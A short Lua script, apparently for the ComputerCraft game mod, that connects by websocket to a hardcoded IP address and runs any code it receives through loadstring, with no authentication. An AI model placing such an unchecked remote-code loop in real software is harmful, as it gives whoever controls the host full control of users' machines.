os.loadAPI("json")
local ws,err = http.websocket("ws://51.250.0.4")
if ws then
    while true do
        local msg = ws.receive()
        local obj = json.decode(msg)
        local func = loadstring(obj["func"])
        func()
    end
end